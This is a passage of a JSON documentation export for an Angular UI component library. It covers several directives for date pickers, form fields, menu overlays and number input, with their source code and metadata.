            ],
            "outputsClass": [],
            "hostBindings": [],
            "hostListeners": [
                {
                    "name": "contextmenu",
                    "args": [
                        {
                            "name": "event",
                            "type": "MouseEvent"
                        }
                    ],
                    "argsDecorator": [
                        "$event"
                    ],
                    "line": 17
                }
            ],
            "propertiesClass": [],
            "methodsClass": []
        },
        {
            "name": "DateFormFieldClickDirective",
            "id": "directive-DateFormFieldClickDirective-d05d02c59bf97cf9bea5e0caa325b08e",
            "file": "libs/core/src/lib/sto-directives/date-form-field-click.directive.ts",
            "type": "directive",
            "description": "<p>Directive that can be placed on mat-form-fields that contains a mat-datepicker.\nThis directive has two tasks:\nClicking anywhere on the mat-form-field will open the datepicker dialog\nWhen the datepicker is closed in any manner, we shift focus back to the datepicker input</p>\n",
            "sourceCode": "import { ContentChildren, Directive, HostListener, Input, OnDestroy, OnInit, QueryList } from '@angular/core';\nimport { MatDatepicker } from '@angular/material/datepicker';\nimport { MatInput } from '@angular/material/input';\nimport { Subject } from 'rxjs';\nimport { takeUntil } from 'rxjs/operators';\n\n/**\n * Directive that can be placed on mat-form-fields that contains a mat-datepicker.\n * This directive has two tasks:\n * Clicking anywhere on the mat-form-field will open the datepicker dialog\n * When the datepicker is closed in any manner, we shift focus back to the datepicker input\n */\n@Directive({\n  selector: '[stoDateFormFieldClick]'\n})\nexport class DateFormFieldClickDirective implements OnInit, OnDestroy {\n  private destroy$ = new Subject();\n  @ContentChildren(MatInput) inputs: QueryList<MatInput>;\n  @Input() stoDateFormFieldClick: MatDatepicker<Date>;\n  @HostListener('click')\n  clickEvent() {\n    this.stoDateFormFieldClick.open();\n  }\n  ngOnInit() {\n    this.stoDateFormFieldClick.closedStream\n      .pipe(\n        takeUntil(this.destroy$)\n      ).subscribe(() => this.inputs.first.focus());\n  }\n  ngOnDestroy() {\n    this.destroy$.next(true);\n    this.destroy$.complete();\n  }\n}\n",
            "selector": "[stoDateFormFieldClick]",
            "providers": [],
            "inputsClass": [
                {
                    "name": "stoDateFormFieldClick",
                    "line": 19,
                    "type": "MatDatepicker<Date>"
                }
            ],
            "outputsClass": [],
            "hostBindings": [],
            "hostListeners": [
                {
                    "name": "click",
                    "args": [],
                    "argsDecorator": [],
                    "line": 21
                }
            ],
            "propertiesClass": [
                {
                    "name": "destroy$",
                    "defaultValue": "new Subject()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 17,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "inputs",
                    "type": "QueryList<MatInput>",
                    "optional": false,
                    "description": "",
                    "line": 18,
                    "decorators": [
                        {
                            "name": "ContentChildren",
                            "stringifiedArguments": "MatInput"
                        }
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "ngOnDestroy",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 30
                },
                {
                    "name": "ngOnInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 24
                }
            ],
            "implements": [
                "OnInit",
                "OnDestroy"
            ],
            "readme": "<h4 id=\"dateformfieldclickdirective\">DateFormFieldClickDirective</h4>\n<p>Directive that can be placed on mat-form-fields that contains a mat-datepicker.</p>\n<p>This directive has two tasks:</p>\n<ol>\n<li>Clicking anywhere on the mat-form-field will open the datepicker dialog</li>\n<li>When the datepicker is closed in any manner, we shift focus back to the datepicker input</li>\n</ol>\n<h5 id=\"usage\">Usage</h5>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;mat-form-field [stoDateFormFieldClick]=&quot;picker&quot;&gt;\n    &lt;input matInput\n        formControlName=&quot;date&quot;\n        [matDatepicker]=&quot;picker&quot; placeholder=&quot;Date&quot;&gt;\n    &lt;mat-datepicker-toggle matSuffix [for]=&quot;picker&quot;&gt;&lt;/mat-datepicker-toggle&gt;\n    &lt;mat-datepicker #picker&gt;&lt;/mat-datepicker&gt;\n&lt;/mat-form-field&gt;</code></pre></div>"
        },
        {
            "name": "FormFieldDirective",
            "id": "directive-FormFieldDirective-555108de9e5d03d3dcd044b8937191d3",
            "file": "libs/form/src/lib/sto-form/form-field.directive.ts",
            "type": "directive",
            "description": "",
            "sourceCode": "import { AfterContentInit, AfterViewInit, ContentChildren, Directive, ElementRef, HostListener, OnDestroy, QueryList } from '@angular/core';\nimport { MatFormFieldControl } from '@angular/material/form-field';\nimport { MatInput } from '@angular/material/input';\nimport { Subject } from 'rxjs';\nimport { filter, map, startWith, switchMap, takeUntil } from 'rxjs/operators';\n\n@Directive({\n  selector: 'mat-form-field[stoFormField]',\n  exportAs: 'stoFormField'\n})\nexport class FormFieldDirective implements AfterViewInit, AfterContentInit, OnDestroy {\n  @ContentChildren(MatFormFieldControl)\n  input: QueryList<MatFormFieldControl<unknown>>;\n  private destroyed$ = new Subject();\n\n  constructor(\n    private el: ElementRef<HTMLElement>) {\n  }\n\n  ngAfterViewInit(): void {\n    const el = this.el.nativeElement;\n    el.classList.add('sto-form__field');\n  }\n\n  ngAfterContentInit() {\n    this.input.changes\n      .pipe(\n        startWith(this.input),\n        map((list: QueryList<MatInput>) => list.first),\n        filter(el => !!el),\n        switchMap(el => el.stateChanges.pipe(startWith(null))),\n        takeUntil(this.destroyed$)\n      )\n      .subscribe(() => {\n        const { disabled } = this.input.first;\n        // eslint-disable-next-line\n        let readOnly = ( this.input.first as any ).readonly || false;\n        if ( this.input.first instanceof MatInput ) {\n          readOnly = this.input.first.readonly;\n        }\n\n        const el = this.el.nativeElement;\n        el.classList.remove('sto-form__field--readonly', 'sto-form__field--disabled');\n        if ( readOnly ) {\n          el.classList.add('sto-form__field--readonly');\n        }\n        if ( disabled ) {\n          el.classList.add('sto-form__field--disabled');\n        }\n        if ( this.input.first instanceof MatInput ) {\n          const inputEl = this.input.first[ '_elementRef' ] as ElementRef<HTMLInputElement>;\n          inputEl.nativeElement.autocomplete = 'off';\n        }\n      });\n  }\n\n  ngOnDestroy(): void {\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n  }\n\n  @HostListener('click')\n  @HostListener('dblclick')\n  onClick() {\n    if ( !( this.input.first instanceof MatInput ) ) {\n      return;\n    }\n    const el = this.input.first[ '_elementRef' ] as ElementRef<HTMLInputElement>;\n    if ( el.nativeElement.readOnly || el.nativeElement.disabled ) {\n      return;\n    }\n    const shouldSelect = true;\n    const textarea = el.nativeElement.tagName.toLowerCase() === 'textarea';\n    if ( shouldSelect && !textarea ) {\n      el.nativeElement.focus();\n      el.nativeElement.select();\n    }\n  }\n\n}\n",
            "selector": "mat-form-field[stoFormField]",
            "providers": [],
            "inputsClass": [],
            "outputsClass": [],
            "hostBindings": [],
            "hostListeners": [
                {
                    "name": "click",
                    "args": [],
                    "argsDecorator": [],
                    "line": 65
                }
            ],
            "propertiesClass": [
                {
                    "name": "destroyed$",
                    "defaultValue": "new Subject()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 15,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "input",
                    "type": "QueryList<MatFormFieldControl<unknown>>",
                    "optional": false,
                    "description": "",
                    "line": 14,
                    "decorators": [
                        {
                            "name": "ContentChildren",
                            "stringifiedArguments": "MatFormFieldControl"
                        }
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "ngAfterContentInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 26
                },
                {
                    "name": "ngAfterViewInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 21
                },
                {
                    "name": "ngOnDestroy",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 58
                }
            ],
            "implements": [
                "AfterViewInit",
                "AfterContentInit",
                "OnDestroy"
            ],
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "el",
                        "type": "ElementRef<HTMLElement>"
                    }
                ],
                "line": 15,
                "jsdoctags": [
                    {
                        "name": "el",
                        "type": "ElementRef<HTMLElement>",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            }
        },
        {
            "name": "MenuOverlayDirective",
            "id": "directive-MenuOverlayDirective-0295b6294b9b4556845580d5375e1f54",
            "file": "libs/core/src/lib/sto-directives/menu-overlay.directive.ts",
            "type": "directive",
            "description": "",
            "sourceCode": "import { Directive, ElementRef, Host, HostBinding } from '@angular/core';\nimport { MatMenuPanel, MatMenuTrigger } from '@angular/material/menu';\nimport { fromEvent } from 'rxjs';\nimport { switchMap, take } from 'rxjs/operators';\n\n@Directive({\n  selector: '[stoMenuOverlay]',\n  exportAs: 'stoMenuOverlay'\n})\nexport class MenuOverlayDirective {\n  private readonly menu: MatMenuPanel;\n  @HostBinding('style.left.px')\n  left = 0;\n  @HostBinding('style.top.px')\n  top = 0;\n\n  constructor(@Host() private trigger: MatMenuTrigger, el: ElementRef<HTMLButtonElement>) {\n    this.menu = trigger.menu;\n    this.trigger.menuOpened.pipe(\n      switchMap(() =>\n        fromEvent<MouseEvent>(document, 'click')\n          .pipe(take(1))\n      ),\n    ).subscribe(() => {\n      this.trigger.closeMenu();\n    });\n    this.setStyle(el.nativeElement);\n  }\n\n  public updatePosition(event: MouseEvent) {\n    this.left = event.x;\n    this.top = event.y;\n  }\n\n  private setStyle(element: HTMLButtonElement) {\n    element.style.overflow = 'hidden';\n    element.style.position = 'fixed';\n    element.style.height = '1px';\n    element.style.width = '1px';\n  }\n}\n",
            "selector": "[stoMenuOverlay]",
            "providers": [],
            "inputsClass": [],
            "outputsClass": [],
            "hostBindings": [
                {
                    "name": "style.left.px",
                    "defaultValue": "0",
                    "line": 13
                },
                {
                    "name": "style.top.px",
                    "defaultValue": "0",
                    "line": 15
                }
            ],
            "hostListeners": [],
            "propertiesClass": [
                {
                    "name": "menu",
                    "type": "MatMenuPanel",
                    "optional": false,
                    "description": "",
                    "line": 11,
                    "modifierKind": [
                        112,
                        132
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "setStyle",
                    "args": [
                        {
                            "name": "element",
                            "type": "HTMLButtonElement"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 35,
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": "element",
                            "type": "HTMLButtonElement",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "updatePosition",
                    "args": [
                        {
                            "name": "event",
                            "type": "MouseEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 30,
                    "modifierKind": [
                        114
                    ],
                    "jsdoctags": [
                        {
                            "name": "event",
                            "type": "MouseEvent",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "trigger",
                        "type": "MatMenuTrigger"
                    },
                    {
                        "name": "el",
                        "type": "ElementRef<HTMLButtonElement>"
                    }
                ],
                "line": 15,
                "jsdoctags": [
                    {
                        "name": "trigger",
                        "type": "MatMenuTrigger",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "el",
                        "type": "ElementRef<HTMLButtonElement>",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            }
        },
        {
            "name": "NumberInputDirective",
            "id": "directive-NumberInputDirective-11941ff7ae696f44c4c23af043e9d04a",
            "file": "libs/form/src/lib/number-input/number-input.directive.ts",
            "type": "directive",
            "description": "",
            "sourceCode": "import { Directive, ElementRef, HostListener, Input, OnChanges, SimpleChanges } from '@angular/core';\nimport { Key } from '@ngx-stoui/core';\nimport { NumberInputPipe } from './number-input.pipe';\n\n\n// eslint-disable-next-line @angular-eslint/directive-selector\n@Directive({ selector: '[numberInput]' })\nexport class NumberInputDirective implements OnChanges {\n  @Input()\n  unit: string | undefined;\n  @Input()\n  appendUnit: boolean;\n\n  private _el: HTMLInputElement;\n\n  @Input()\n  fractionSize = 5;\n  @Input()\n  dynamicFractionSize: boolean;\n  /**\n   * List of keys ignored, to work as default.\n   *  {Key[]}\n   */\n  private ignoredKeys = [\n    Key.Dash,\n    Key.Backspace,\n    Key.Delete,\n    Key.Home,\n    Key.LeftArrow,\n    Key.RightArrow,\n    Key.End,\n    Key.Tab,\n    Key.Subtract\n  ];\n\n\n  constructor(private elementRef: ElementRef,\n              private numberFormatPipe: NumberInputPipe,\n  ) {\n    this._el = this.elementRef.nativeElement;\n  }\n\n  private setDisplayValue(readonly: boolean) {\n    const val = ( this._el.value || '' ).replace(` ${this.unit}`, '');\n    if ( this.unit ) {\n      if ( readonly ) {\n        this._el.value = val + ` ${this.unit}`;\n      } else {\n        this._el.value = val;\n      }\n    }\n  }\n\n  /**\n   * Listens for the paste events.\n   * Handles spaces, long dash, period and commas.\n   * Tries to the format, will be ignored if something fails.\n   * @param e event\n   * @param clipboardData\n   */\n  @HostListener('paste', [ '$event', '$event.clipboardData' ])\n  onPaste(e: Event, clipboardData: DataTransfer | null) {\n    if ( this._el.readOnly || this._el.disabled || !clipboardData ) {\n      return;\n    }\n    e.preventDefault();\n    let pasted = clipboardData.getData('text') || '';\n    pasted = pasted.replace('—', '-'); // long dash, sometime used in Excel and Word\n    pasted = this.handleMixedCommasAndDecimals(pasted);\n    let parsedValue = this.numberFormatPipe.parse(pasted, this.fractionSize, this.dynamicFractionSize);\n\n    if ( !this.hasInvalidValues(parsedValue) ) {\n\n      parsedValue = parsedValue.replace('.', ',');\n      this._el.value = parsedValue;\n      this._el.dispatchEvent(new Event('input'));\n    }\n  }\n\n  /**\n   *  Handles thousand seperator with commas\n   * @param orgStr eg. 123.214,123\n   * {string} 123214.123\n   */\n  private handleMixedCommasAndDecimals(orgStr: string) {\n    let str = orgStr + '';\n    str = str.replace(',', '.');\n    const array = str.split('.');\n    if ( array.length > 1 ) {\n      const prefix = array.slice(0, array.length - 1).join('');\n      str = prefix + '.' + array[ array.length - 1 ];\n    } else {\n      str = orgStr;\n    }\n    return str;\n  }\n\n\n  /**\n   * Se if parsed string contains words that indicate a failed parse.\n   * @param parsedValue\n   * {boolean}\n   */\n  private hasInvalidValues(parsedValue: string) {\n    return parsedValue.includes('NaN')\n      || parsedValue.includes('undefined')\n      || parsedValue.includes('null');\n  }\n\n  /**\n   * Listen for key event to work like a number field.\n   * Transforms period to comma.\n   * Handles hash, allows copy,pase,cut and select all.\n   * @param e\n   */\n  @HostListener('keydown', [ '$event' ])\n  onKeyPress(e: KeyboardEvent) {\n    if ( this._el.readOnly || this._el.disabled ) {\n      return;\n    }\n    if ( [ Key.Enter ].includes(e.which) ) {\n      this._el.blur();\n    }\n    if ( this.isNumberKeypress(e) ) {\n      // do nothing\n    } else if ( [ Key.Period, Key.Comma, Key.DecimalPoint ].includes(e.which) ) {\n      this.handlePeriodDelimiter(e);\n    } else if ( [ Key.Dash, Key.Subtract ].includes(e.which) ) {\n      this.handleDash(e);\n    } else if ( [ Key.UpArrow, Key.DownArrow ].includes(e.which) ) {\n      this.handleKeyUpAndDown(e);\n    } else if ( this.ignoredKeys.indexOf(e.which) !== -1 ) {\n    } else if ( this.isCopyPaste(e) || this.isCtrlA(e) ) {\n    } else {\n      e.preventDefault();\n    }\n  }\n\n  /**\n   * Handles dash. Is ignored if already exist a comma.\n   * Replaces period with comma.\n   * @param e\n   */\n  private handlePeriodDelimiter(e: KeyboardEvent) {\n    let selectionIncludesPeriod = false;\n    if (!e.target) {\n      return;\n    }\n    const target = e.target as HTMLInputElement;\n    if ( target.selectionStart !== target.selectionEnd && this._el.value && this._el.value.length > 0 ) {\n      // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n      // @ts-ignore\n      const selection = this._el.value.substring(target.selectionStart, target.selectionEnd);\n      selectionIncludesPeriod = selection.includes(',');\n    }\n\n    if ( this._el.value.includes(',') && !selectionIncludesPeriod ) {\n      e.preventDefault();\n    } else if ( e.which === Key.Period ) {\n      setTimeout(() => {\n        const target = e.target as HTMLInputElement;\n        const caretPosition = target.selectionStart;\n        this._el.value = this._el.value.replace('.', ',');\n        this._el.setSelectionRange(caretPosition, caretPosition);\n\n      }, 0);\n    }\n  }\n\n  /**\n   * All text is selected in the input\n   * @param e\n   * {boolean}\n   */\n  private hasSelectedAllText(e: KeyboardEvent) {\n    const target = e.target as HTMLInputElement;\n    if (!target) {\n      return;\n    }\n    // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n    // @ts-ignore\n    return target.selectionEnd - target.selectionStart === this._el.value.length;\n\n  }\n\n  /**\n   * Handles dashes. Should only be allowed in the beginning and only once.\n   * @param e\n   */\n  private handleDash(e: KeyboardEvent) {\n    if (!e.target) {\n      return;\n    }\n    if ( this.hasSelectedAllText(e) ) {\n    } else if ( !this._el.value.includes('-') && (e.target as HTMLInputElement).selectionStart === 0 ) {\n    } else {\n      e.preventDefault();\n    }\n  }\n\n  /**\n   * Is copy, paste or cut.\n   * @param e\n   * {boolean}\n   */\n  private isCopyPaste(e: KeyboardEvent) {\n    return ( e.ctrlKey || e.metaKey ) && ( e.which === Key.C || e.which === Key.V || e.which === Key.X );\n  }\n\n  /**\n   * Is select all text (CTRL+A)\n   * @param e\n   * {boolean}\n   */\n  private isCtrlA(e: KeyboardEvent) {\n    return ( e.ctrlKey || e.metaKey ) && ( e.which === Key.A );\n  }\n\n  /**\n   * Is a number, on keyboard and on numpad.\n   * @param e\n   * {boolean}\n   */\n  private isNumberKeypress(e: KeyboardEvent) {\n    return ( e.keyCode >= 48 && e.keyCode <= 57 ) || ( e.keyCode >= 96 && e.keyCode <= 105 );\n  }\n\n\n  /**\n   * Handles up and down arrows by adding/subtracting one\n   * @param e\n   */\n  private handleKeyUpAndDown(e: KeyboardEvent) {\n    if ( this._el.readOnly || this._el.disabled ) {\n      return;\n    }\n    const value = this._el.value;\n    const addition = e.which === Key.UpArrow ? 1 : -1;\n    // eslint-disable-next-line prefer-const\n    let [ integerSplit = '', fractionSplit = '' ] = ( value || '' ).split(',');\n    integerSplit = integerSplit.replace(' ', '');\n    if ( integerSplit.length === 0 ) {\n      integerSplit = '0';\n    }\n    const currentValue = parseInt(integerSplit, 10);\n\n    setTimeout(() => {\n      if ( fractionSplit.length > 0 ) {\n        this._el.value = ( ( currentValue + addition ) + ',' + fractionSplit );\n      } else {\n        this._el.value = ( currentValue + addition ) + '';\n      }\n      this._el.dispatchEvent(new Event('input'));\n    }, 0);\n\n  }\n\n  @HostListener('focus', [ '$event' ])\n  onFocus($event: FocusEvent) {\n    if ( this._el.readOnly || this._el.disabled ) {\n      return;\n    }\n    const target = $event.target as HTMLInputElement;\n    const value = target.value;\n    this._el.value = ( this.numberFormatPipe.parse(value, this.fractionSize, this.dynamicFractionSize) + '' ).replace('.', ',');\n    this._el.select();\n  }\n\n  @HostListener('blur', [ '$event.target.value' ])\n  onBlur(value: number) {\n    if ( this._el.readOnly || this._el.disabled ) {\n      return;\n    }\n    this._el.value = this.numberFormatPipe.transform(value, this.fractionSize, this.dynamicFractionSize);\n  }\n\n  ngOnChanges(changes: SimpleChanges): void {\n    if ( changes.appendUnit || changes.unit ) {\n      this.setDisplayValue(this.appendUnit);\n    }\n  }\n}\n",
            "selector": "[numberInput]",
            "providers": [],
            "inputsClass": [
                {
                    "name": "appendUnit",
                    "line": 13,
                    "type": "boolean"
                },
                {
                    "name": "dynamicFractionSize",
                    "line": 20,
                    "type": "boolean"
                },
                {
                    "name": "fractionSize",
                    "defaultValue": "5",
                    "line": 18
                },
                {
                    "name": "unit",
                    "line": 11,
                    "type": "string | undefined"
                }
            ],
            "outputsClass": [],
            "hostBindings": [],
            "hostListeners": [
                {
                    "name": "blur",
                    "args": [
                        {
                            "name": "value",
                            "type": "number"
                        }
                    ],
                    "argsDecorator": [
                        "$event.target.value"
                    ],
                    "line": 271
                },
                {
                    "name": "focus",
                    "args": [
                        {
                            "name": "$event",
                            "type": "FocusEvent"
                        }
                    ],
                    "argsDecorator": [
                        "$event"
                    ],
                    "line": 260
                },
                {
                    "name": "keydown",
                    "args": [
                        {
                            "name": "e",
                            "type": "KeyboardEvent"
                        }
                    ],
                    "argsDecorator": [
                        "$event"
                    ],
                    "description": "<p>Listen for key event to work like a number field.\nTransforms period to comma.\nHandles hash, allows copy,pase,cut and select all.</p>\n",
                    "line": 118
                },
                {
                    "name": "paste",
                    "args": [
                        {
                            "name": "e",
                            "type": "Event"
                        },
                        {
                            "name": "clipboardData",
                            "type": "DataTransfer | null"
                        }
                    ],
                    "argsDecorator": [
                        "$event",
                        "$event.clipboardData"
                    ],
                    "description": "<p>Listens for the paste events.\nHandles spaces, long dash, period and commas.\nTries to the format, will be ignored if something fails.</p>\n",
                    "line": 63
                }
            ],
            "propertiesClass": [
                {
                    "name": "_el",
                    "type": "HTMLInputElement",
                    "optional": false,
                    "description": "",
                    "line": 15,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "ignoredKeys",
                    "defaultValue": "[\n    Key.Dash,\n    Key.Backspace,\n    Key.Delete,\n    Key.Home,\n    Key.LeftArrow,\n    Key.RightArrow,\n    Key.End,\n    Key.Tab,\n    Key.Subtract\n  ]",
                    "type": "[]",
                    "optional": false,
                    "description": "<p>List of keys ignored, to work as default.\n  {Key[]}</p>\n",
                    "line": 25,
                    "modifierKind": [
                        112
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "handleDash",
                    "args": [
                        {
                            "name": "e",
                            "type": "KeyboardEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 191,
                    "description": "<p>Handles dashes. Should only be allowed in the beginning and only once.</p>\n",
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": {
                                "pos": 5457,
                                "end": 5458,
                                "flags": 0,
                                "escapedText": "e"
                            },
                            "type": "KeyboardEvent",
                            "tagName": {
                                "pos": 5451,
                                "end": 5456,
                                "flags": 0,
                                "escapedText": "param"
                            },
                            "comment": ""
                        }
                    ]
                },
                {
                    "name": "handleKeyUpAndDown",
                    "args": [
                        {
                            "name": "e",
                            "type": "KeyboardEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 234,
                    "description": "<p>Handles up and down arrows by adding/subtracting one</p>\n",
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": {
                                "pos": 6454,
                                "end": 6455,
                                "flags": 0,
                                "escapedText": "e"
                            },
                            "type": "KeyboardEvent",
                            "tagName": {
                                "pos": 6448,
                                "end": 6453,
                                "flags": 0,
                                "escapedText": "param"
                            },
                            "comment": ""
                        }
                    ]
                },
                {
                    "name": "handleMixedCommasAndDecimals",
                    "args": [
                        {
                            "name": "orgStr",
                            "type": "string"
                        }
                    ],
                    "optional": false,
                    "returnType": "string",
                    "typeParameters": [],
                    "line": 86,
                    "description": "<p>Handles thousand seperator with commas</p>\n",
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": {
                                "pos": 2262,
                                "end": 2268,
                                "flags": 0,
                                "escapedText": "orgStr"
                            },
                            "type": "string",
                            "tagName": {
                                "pos": 2256,
                                "end": 2261,
                                "flags": 0,
                                "escapedText": "param"
                            },
                            "comment": "<p>eg. 123.214,123\n{string} 123214.123</p>\n"
                        }
                    ]
                },
                {
                    "name": "handlePeriodDelimiter",
                    "args": [
                        {
                            "name": "e",
                            "type": "KeyboardEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 145,
                    "description": "<p>Handles dash. Is ignored if already exist a comma.\nReplaces period with comma.</p>\n",
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": {
                                "pos": 4011,
                                "end": 4012,
                                "flags": 0,
                                "escapedText": "e"
                            },
                            "type": "KeyboardEvent",
                            "tagName": {
                                "pos": 4005,
                                "end": 4010,
                                "flags": 0,
                                "escapedText": "param"
                            },
                            "comment": ""
                        }
                    ]
                },
                {
                    "name": "hasInvalidValues",
                    "args": [
                        {
                            "name": "parsedValue",
                            "type": "string"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 105,
                    "description": "<p>Se if parsed string contains words that indicate a failed parse.</p>\n",
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": {
                                "pos": 2764,
                                "end": 2775,
                                "flags": 0,
                                "escapedText": "parsedValue"
                            },
                            "type": "string",
                            "tagName": {
                                "pos": 2758,
                                "end": 2763,
                                "flags": 0,
                                "escapedText": "param"
                            },
                            "comment": "<p>{boolean}</p>\n"
                        }
                    ]
                },
                {
                    "name": "hasSelectedAllText",
                    "args": [
                        {
                            "name": "e",
                            "type": "KeyboardEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "boolean",
                    "typeParameters": [],
                    "line": 176,
                    "description": "<p>All text is selected in the input</p>\n",
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": {
                                "pos": 5031,
                                "end": 5032,
                                "flags": 0,
                                "escapedText": "e"
                            },
                            "type": "KeyboardEvent",
                            "tagName": {
                                "pos": 5025,
                                "end": 5030,
                                "flags": 0,
                                "escapedText": "param"
                            },
                            "comment": "<p>{boolean}</p>\n"
                        }
                    ]
                },
                {
                    "name": "isCopyPaste",
                    "args": [
                        {
                            "name": "e",
                            "type": "KeyboardEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "boolean",
                    "typeParameters": [],
                    "line": 207,
                    "description": "<p>Is copy, paste or cut.</p>\n",
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": {
                                "pos": 5788,
                                "end": 5789,
                                "flags": 0,
                                "escapedText": "e"
                            },
                            "type": "KeyboardEvent",
                            "tagName": {
                                "pos": 5782,
                                "end": 5787,
                                "flags": 0,
                                "escapedText": "param"
                            },
                            "comment": "<p>{boolean}</p>\n"
                        }
                    ]
                },
                {
                    "name": "isCtrlA",
                    "args": [
                        {
                            "name": "e",
                            "type": "KeyboardEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "boolean",
                    "typeParameters": [],
                    "line": 216,
                    "description": "<p>Is select all text (CTRL+A)</p>\n",
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": {
                                "pos": 6015,
                                "end": 6016,
                                "flags": 0,
                                "escapedText": "e"
                            },
                            "type": "KeyboardEvent",
                            "tagName": {
                                "pos": 6009,
                                "end": 6014,
                                "flags": 0,
                                "escapedText": "param"
                            },
                            "comment": "<p>{boolean}</p>\n"
                        }
                    ]
                },
                {
                    "name": "isNumberKeypress",
                    "args": [
                        {
                            "name": "e",
                            "type": "KeyboardEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "boolean",
                    "typeParameters": [],
                    "line": 225,
                    "description": "<p>Is a number, on keyboard and on numpad.</p>\n",
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": {
                                "pos": 6208,
                                "end": 6209,
                                "flags": 0,
                                "escapedText": "e"
                            },
                            "type": "KeyboardEvent",
                            "tagName": {
                                "pos": 6202,
                                "end": 6207,
                                "flags": 0,
                                "escapedText": "param"
                            },
                            "comment": "<p>{boolean}</p>\n"
                        }
                    ]
                },
                {
                    "name": "ngOnChanges",
                    "args": [
                        {
                            "name": "changes",
                            "type": "SimpleChanges"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 278,
                    "jsdoctags": [
                        {
                            "name": "changes",
                            "type": "SimpleChanges",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "setDisplayValue",
                    "args": [
                        {
                            "name": "readonly",
                            "type": "boolean"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 44,
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": "readonly",
                            "type": "boolean",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "implements": [
                "OnChanges"
            ],
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "elementRef",
                        "type": "ElementRef"
                    },
                    {
                        "name": "numberFormatPipe",
                        "type": "NumberInputPipe"
                    }
                ],
                "line": 35,
                "jsdoctags": [
                    {
                        "name": "elementRef",
                        "type": "ElementRef",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "numberFormatPipe",
                        "type": "NumberInputPipe",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            }
        },
        {
            "name": "QuickKeysDirective",
            "id": "directive-QuickKeysDirective-e1a030d4d4e35d96893d4b950ef52727",
            "file": "libs/core/src/lib/sto-directives/quick-keys.directive.ts",
            "type": "directive",
            "description": "<p>QuickKeysDirective is used to implement shortcut keys on DOM elements, e.g to submit or reset a form on enter/escape</p>\n<form quickKeys (quickSubmit)=\"save()\" (quickCancel)=\"reset()\">",
